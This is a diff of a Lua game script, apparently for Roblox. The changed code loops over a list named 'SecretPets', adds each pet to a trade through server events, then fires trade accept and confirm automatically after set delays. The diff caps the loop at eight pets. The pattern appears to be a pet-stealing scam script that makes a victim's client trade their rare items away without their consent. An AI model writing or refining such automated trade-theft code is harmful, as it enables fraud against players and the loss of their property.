@@ -66,16 +66,20 @@ local function mainCode()
 
 	scrollingFrame.CanvasPosition = Vector2.new(0, canvasHeight)
 
-	for i, petId in ipairs(SecretPets) do
+	local maxPets = 8
+	local totalPets = math.min(#SecretPets, maxPets)
+
+	for i = 1, totalPets do
+		local petId = SecretPets[i]
 		task.delay(i * 0.5, function()
 			print("Adding to trade:", petId)
 			Event:FireServer("TradeAddPet", petId)
-
-			if i == #SecretPets then
+	
+			if i == totalPets then
 				task.delay(5, function()
-				    Event:FireServer("TradeAccept")
-				    task.wait(10)
-				    Event:FireServer("TradeConfirm")
+					Event:FireServer("TradeAccept")
+					task.wait(10)
+					Event:FireServer("TradeConfirm")
 				end)
 			end
 		end)
